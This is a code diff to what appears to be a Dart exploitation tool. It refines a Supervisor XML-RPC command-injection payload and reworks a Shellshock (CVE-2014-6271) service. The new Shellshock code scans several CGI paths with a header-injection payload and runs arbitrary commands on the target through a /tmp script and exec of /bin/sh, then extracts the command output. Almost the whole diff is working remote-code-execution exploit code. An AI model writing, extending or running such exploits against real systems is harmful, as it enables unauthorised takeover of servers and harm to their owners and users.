@@ -20,7 +20,7 @@ class SupervisorExpService {
 <methodCall>
 <methodName>supervisor.supervisord.options.warnings.linecache.os.system</methodName>
 <params>
-<param><string>$cmd</string></param>
+<param><string><![CDATA[$cmd]]></string></param>
 </params>
 </methodCall>''';
 
@@ -198,40 +198,86 @@ class ShellshockExpService {
   final String cgiPath;
   final Duration timeout;
 
+  /// 检测成功后记录的实际可用路径，供 execRce 使用
+  String? discoveredPath;
+
   ShellshockExpService({
     required this.baseUrl,
-    this.cgiPath = '/cgi-bin/test.cgi',
+    this.cgiPath = '/victim.cgi',
     this.timeout = const Duration(seconds: 10),
   });
 
   String get _base =>
       baseUrl.endsWith('/') ? baseUrl.substring(0, baseUrl.length - 1) : baseUrl;
 
-  Future<ExpResult> check() async {
-    try {
-      final res = await http.get(
-        Uri.parse('$_base$cgiPath'),
-        headers: {'User-Agent': '() { :; }; echo; echo SHELLSHOCK_54289'},
-      ).timeout(timeout);
-      if (res.body.contains('SHELLSHOCK_54289')) {
-        return ExpResult(
-          true,
-          'CVE-2014-6271 (Shellshock)',
-          'Shellshock 存在，环境变量注入验证通过',
-        );
+  // 必须包含 Content-Type 头，否则 Apache mod_cgi 返回 500 错误页
+  static const _checkPayload =
+      '() { :; }; echo Content-Type: text/plain; echo; echo SHELLSHOCK_54289';
+
+  static const _candidatePaths = [
+    '/victim.cgi',
+    '/cgi-bin/victim.cgi',
+    '/cgi-bin/test.cgi',
+    '/cgi-bin/vulnerable',
+  ];
+
+  Future<ExpResult> check({void Function(String)? onLog}) async {
+    // 先尝试用户配置的路径，再逐一尝试常见备选路径
+    final paths = [
+      cgiPath,
+      ..._candidatePaths.where((p) => p != cgiPath),
+    ];
+
+    for (final path in paths) {
+      final url = '$_base$path';
+      onLog?.call('[*] 探测 $url');
+      try {
+        final res = await http.get(
+          Uri.parse(url),
+          headers: {'User-Agent': _checkPayload},
+        ).timeout(timeout);
+        onLog?.call('[i] HTTP ${res.statusCode}  body(${res.body.length}B): ${res.body.substring(0, res.body.length.clamp(0, 80)).replaceAll('\n', ' ')}');
+        if (res.body.contains('SHELLSHOCK_54289')) {
+          discoveredPath = path;
+          return ExpResult(
+            true,
+            'CVE-2014-6271 (Shellshock)',
+            'Shellshock 存在，注入路径: $path',
+          );
+        }
+      } catch (e) {
+        onLog?.call('[!] $path 请求失败: $e');
       }
-    } catch (_) {}
+    }
     return const ExpResult(false, 'CVE-2014-6271 (Shellshock)', '');
   }
 
-  Future<String?> execRce(String cmd) async {
+  static const _rceS = 'MATRIX_RCE_S';
+  static const _rceE = 'MATRIX_RCE_E';
+
+  Future<String?> execRce(String cmd, {void Function(String)? onLog}) async {
+    final path = discoveredPath ?? cgiPath;
+    // bash-4.3 Shellshock 上下文中 fork() 外部命令会导致进程崩溃。
+    // 解法：用 bash builtin 将命令写入 /tmp 临时脚本，再用 exec /bin/sh 替换进程（无 fork）。
+    // unset HTTP_USER_AGENT 防止 sh 启动时再次触发 Shellshock 递归。
+    final escapedCmd = cmd.replaceAll("'", r"'\''");
+    final payload = "() { :; }; echo Content-Type: text/plain; echo; "
+        "{ echo 'echo $_rceS'; echo '$escapedCmd'; echo 'echo $_rceE'; } > /tmp/_ss_\$\$; "
+        "unset HTTP_USER_AGENT; exec /bin/sh /tmp/_ss_\$\$";
+    final url = '$_base$path';
     try {
       final res = await http.get(
-        Uri.parse('$_base$cgiPath'),
-        headers: {'User-Agent': '() { :; }; echo; $cmd'},
+        Uri.parse(url),
+        headers: {'User-Agent': payload},
       ).timeout(timeout);
-      return res.body.isNotEmpty ? res.body : null;
-    } catch (_) {
+      final body = res.body;
+      final s = body.indexOf(_rceS);
+      final e = body.indexOf(_rceE);
+      if (s == -1 || e == -1) return null;
+      final out = body.substring(s + _rceS.length, e).trim();
+      return out.isEmpty ? '(命令已执行，无输出)' : out;
+    } catch (e) {
+      onLog?.call('[!] execRce 异常: $e');
       return null;
     }
   }
